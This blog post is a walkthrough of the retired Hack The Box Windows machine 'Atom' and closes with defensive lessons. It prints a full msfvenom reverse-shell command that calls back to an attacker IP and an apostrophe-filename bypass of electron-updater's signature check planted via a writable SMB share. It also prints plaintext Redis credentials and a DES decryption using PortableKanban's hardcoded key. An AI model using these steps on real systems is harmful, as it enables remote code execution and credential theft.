---
layout: post
title: "The Update That Updated You"
subtitle: "HTB Atom, where a desktop app trusts a folder strangers can write to, and a single apostrophe in a filename walks past the signature check"
date: 2021-07-17 12:00:00 +0000
description: "A note-taking app phones home for updates to a share that anyone can write to, and one apostrophe in a filename turns its security check into a yes."
image: /assets/og/the-update-that-updated-you.png
tags: [hackthebox, writeup]
---

Atom is a box about the thing you were told was safe. A desktop app that updates itself, signed and checked, the responsible-engineering checkbox everyone ticks. Except the app fetches its updates from a folder that strangers can write to, and the signature check that was supposed to be the last line of defense has a flaw so small it fits inside a single apostrophe. You drop a poisoned update into the share, you give the file a name with a quote in it, and the verification routine trips over its own syntax and reports success instead of failure. The app downloads your code and runs it, proudly, as part of keeping itself current. Then privesc is a paper trail. A kanban app left its config lying around, the config points at a Redis instance, Redis is holding the admin password, and the password is locked with a key that ships inside a public exploit. Two doors, both held open by trust that was never earned.

```
        A T O M   /   self-update
        ========================
        app:  "time to update. let me check the folder."
        share \\atom\Software_Updates   (guests may write)
                        |
        you drop:  latest.yml  +  r'ev.exe
                        |
        verifier runs a powershell signature check,
        the apostrophe breaks the command,
        the error gets read as "looks good to me"
                        |
                        v
        the app installs your update.
        the update is a shell.
                                            原
```

## 0x01 · the storefront

`nmap` paints a Windows host that is doing a lot of jobs at once. A web stack on 80 and 443, the usual Windows RPC and SMB, WinRM up high, and two services that do not belong on a polite desktop.

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.46 (Win64)
135/tcp  open  msrpc         Microsoft Windows RPC
443/tcp  open  ssl/http      Apache httpd 2.4.46 (Win64)
445/tcp  open  microsoft-ds
5985/tcp open  http          Microsoft HTTPAPI 2.0 (WinRM)
6379/tcp open  redis         Redis key-value store
7680/tcp open  pando-pub
```

Read the two oddballs like tells. Redis on 6379 is a database that, by tradition, assumes the only people who can reach it already belong there. WinRM on 5985 is the remote-management door, the clean way in once you hold a credential. Hold both. They pay out at opposite ends of the box. The website itself is a landing page for an app called Heed, a note-taking tool, with a download link to `heed_setup_v1.0.0.zip`. A desktop app you are invited to install is a desktop app worth taking apart.

## 0x02 · cracking the app open

Heed is an Electron app, which is a useful thing to recognize on sight. Electron means the program is a web page wearing a desktop costume, and all of its real logic is JavaScript bundled into a single archive called an `app.asar`. Picture a vending machine that is secretly a laptop running a website behind the glass. Pop the panel and the whole menu is just code you can read.

Unpack the archive and read the source.

```
$ npx asar extract resources/app.asar heed_src
$ grep -ri "update" heed_src/
   ... electron-updater ...
   url: http://updates.atom.htb
```

So the app uses `electron-updater`, and on launch it phones `http://updates.atom.htb` for a file named `latest.yml` that describes the newest version. If a newer version exists, the app downloads the installer named in that file and runs it. The entire update mechanism is "trust whatever this YAML says." The only question left is where the YAML lives and whether you can put your own there.

## 0x03 · a folder strangers can write to

Back to SMB. List the shares as a guest and one of them is not like the others.

```
$ smbmap -H 10.10.10.237 -u guest
   Disk                  Permissions
   ----                  -----------
   Software_Updates      READ, WRITE
```

`Software_Updates` is writable to anyone. Inside sit three client folders and a piece of testing documentation explaining that updates dropped here get picked up and verified automatically. Think of it like a pharmacy that lets any customer restock the shelves, then dispenses whatever is on them without a second look. The update server's source of truth is a drawer the public can reach into.

Now the chain is obvious in outline. Build a malicious update, write a `latest.yml` that points at it, drop both into the share, and wait for the app to swallow it. The only thing standing in the way is the signature check `electron-updater` runs before it executes a downloaded installer. That check is the whole game, and it loses on a technicality.

## 0x04 · the apostrophe that said yes

Here is the flaw, and it is beautiful in the way that the worst bugs are beautiful. When `electron-updater` verifies a downloaded file on Windows, it shells out to PowerShell to read the file's code signature, and it builds that command by pasting the filename directly into the command string, wrapped in single quotes. You have seen this disease before. Anytime a program glues attacker-controlled text into a command, the text can stop being a name and start being syntax.

So you name your file with an apostrophe in it. Call it `r'ev.exe`. When the verifier builds its PowerShell command around `'r'ev.exe'`, the stray quote closes the string early, PowerShell throws a parse error, and the routine catches an error that is not the error it was checking for. The downloaded file is unsigned garbage. The check was supposed to scream. Instead it trips, stands up, dusts itself off, and reports that everything is fine. Picture a bouncer who is told to reject anyone whose ID does not scan. You hand him an ID shaped so weird the scanner jams, and his rule was "let them in unless the scanner says no." The scanner never said no. It never said anything. You walk in.

Build the payload, name it with the quote, and stand up a `latest.yml` describing it. The YAML carries the version, the filename, and a SHA512 that has to match your binary so the size and hash checks pass. Only the signature check is bypassed. The integrity check still wants honest numbers.

```
$ msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.14.4 LPORT=443 -f exe -o "r'ev.exe"
   [ a windows reverse shell exe, calling back to 10.10.14.4 on 443 ]

$ cat latest.yml
version: 2.2.3
path: r'ev.exe
sha512: <base64 sha512 of r'ev.exe>
files:
  - url: r'ev.exe
    sha512: <same hash>
```

Drop `latest.yml` and `r'ev.exe` into a client folder on the share, start a listener, and wait for the app to do its rounds.

```
$ smbclient //10.10.10.237/Software_Updates -U guest
smb> cd client1
smb> put latest.yml
smb> put "r'ev.exe"

$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.237
C:\> whoami
atom\jason
```

The app updated itself into a reverse shell. `user.txt` is sitting on jason's desktop.

```
C:\> type C:\Users\jason\Desktop\user.txt
████████████████████████████████
```

## 0x05 · the config that pointed at the vault

jason is an ordinary user, so go looking for what jason left lying around. In the Downloads folder sits PortableKanban, a little task-board app, and next to it a config file. Apps that talk to a backend keep the address and the keys to that backend in a config, and PortableKanban is no exception.

```
C:\> type C:\Users\jason\Downloads\PortableKanban\PortableKanban.cfg
   ... "Server":"127.0.0.1" ... "Port":6379 ...
   ... "Password":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb" ...
```

That is Redis, the service we saw on 6379, and the password is stored in PortableKanban's own encrypted format. Hold that string. But Redis on this box has its own password too, and Windows installs of Redis keep it in plain text in a service config file.

```
C:\> type "C:\Program Files\Redis\redis.windows-service.conf"
   requirepass kidvscat_yes_kidvscat
```

That is the doorknob to the database. Connect, authenticate, and read what it is holding.

```
$ redis-cli -h 10.10.10.237
10.10.10.237:6379> auth kidvscat_yes_kidvscat
OK
10.10.10.237:6379> keys *
   "pk:urn:user:e8e29158-..."
10.10.10.237:6379> get pk:urn:user:e8e29158-...
   ... "Name":"Administrator" ...
   ... "EncryptedPassword":"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi" ...
```

Redis is holding a user record for Administrator, and the record carries an encrypted password. It is the same scheme PortableKanban used in its config. Which means the lock and the key were shipped together.

## 0x06 · a key that came in the box

PortableKanban version 4.3 has a public encrypted-password-disclosure writeup, and the punchline is that the encryption is theater. The passwords are base64-encoded and then DES-encrypted with a key and IV hardcoded into the application itself. The key is `7ly6UznJ`. The IV is `XuVUm5fR`. They are printed in the exploit, because they are printed in the program, because the same secret protects every install on Earth. Think of it like a diary with a lock, sold by the million, where every diary opens with the exact same tiny key taped to the back cover. Locking it changes nothing. Everyone who owns the brand owns yours.

So take the encrypted Administrator blob out of Redis and run it back through DES with the key that came in the box.

```
$ python3 -c '
from Crypto.Cipher import DES
import base64
blob = base64.b64decode("Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi")
d = DES.new(b"7ly6UznJ", DES.MODE_CBC, b"XuVUm5fR")
print(d.decrypt(blob))'
   b'kidvscat_admin_@123'
```

A real, plaintext Administrator password. WinRM has been waiting on 5985 this whole time for exactly this. Confirm the credential, then walk through the management door.

```
$ crackmapexec winrm 10.10.10.237 -u administrator -p 'kidvscat_admin_@123'
   WINRM  10.10.10.237  (Pwn3d!)

$ evil-winrm -i 10.10.10.237 -u administrator -p 'kidvscat_admin_@123'
*Evil-WinRM* PS C:\> whoami
atom\administrator
*Evil-WinRM* PS C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

No exploit for the last step. The password was always going to open the door. It was just stored behind a lock whose key was public knowledge.

## 0x07 · the honest caveat

Atom is easy to dismiss as a stack of specific bugs that all got patched. The `electron-updater` quote flaw is fixed. PortableKanban's static DES key is documented and dead. But the shape of this box is not a fossil, and the shape is the point.

The update bug is the one I would lose sleep over, because the auto-updater is the most trusted code path a desktop app has. It runs with the app's privileges, it runs without a human in the loop, and it is explicitly designed to fetch code from elsewhere and run it. Everyone builds one because not shipping security fixes is worse. But an updater is only as trustworthy as the place it fetches from and the check it runs before it executes. Atom got both wrong at once. The fetch location was a folder the public could write to, and the check was a string-built shell command that an apostrophe could break. Either flaw alone is survivable. Stacked, they turn the app's most responsible feature into a remote-code-execution service that the app provides to anyone who can reach a file share.

And the privesc is the quieter, more universal sin. Nobody on Atom hid a secret badly. They hid it the normal way, with encryption, which is exactly what felt safe. The trouble is that encryption with a key everyone already has is just base64 wearing a costume. A reversible scrambling protects a password from a glance and from nobody else. The instant the key is shared, hardcoded, or shippable, the secret is plaintext with extra steps. The real defense is to keep credentials out of files that lower-privileged users can read in the first place, and to never confuse "encrypted" with "secret" when the key travels with the data.

## 0x08 · outro

```
the app updated itself, the way it was built to.
the folder it trusted, anyone could write to.
the check it ran, an apostrophe could break.

the admin password was locked, the way it was built to be.
the key to the lock came printed in the manual.

trust the updater, but only as far as you trust the folder.
encrypt the secret, but only if the key stays home. wear black.

                                                            EOF
```

---

*HTB: Atom, retired 10 Jul 2021. A medium Windows box that is really a lecture on update trust wearing an Electron costume, with a privesc that proves a hardcoded key is no key at all. The apostrophe still parses wrong in a lab and nowhere you don't own.*